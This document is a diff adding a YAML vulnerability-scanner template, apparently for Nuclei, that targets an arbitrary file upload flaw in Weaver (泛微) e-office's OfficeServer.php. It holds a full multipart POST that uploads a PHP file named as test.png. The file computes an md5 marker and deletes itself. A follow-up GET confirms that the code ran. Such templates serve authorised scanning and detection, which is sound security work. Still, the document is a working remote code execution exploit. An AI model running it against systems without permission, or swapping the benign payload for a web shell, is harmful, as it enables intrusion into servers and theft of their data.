@@ -1,0 +1,54 @@
+id: poc-yaml-weaver-e-office-officeserver-savetemplate-anyfile-upload
+info:
+  name: 泛微OA e-office OfficeServer_SAVETEMPLATE 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: '{{rand_int(1000,9999)}}'
+  t2: '{{md5(t1)}}'
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/iWebOffice/OfficeServer.php"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO"
+    body: |-
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="TEMPLATE"
+
+      {{t1}}.php
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="OPTION"
+
+      SAVETEMPLATE
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO
+      Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"
+
+      <?=md5({{t1}});unlink(__FILE__);
+      ------WebKitFormBoundarySIELKZKzD7vQmdsO--
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "DBSTEP"
+          - "STATUS="
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/attachment/{{t1}}.php"
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{t2}}"
+      - type: status
+        status:
+          - 200
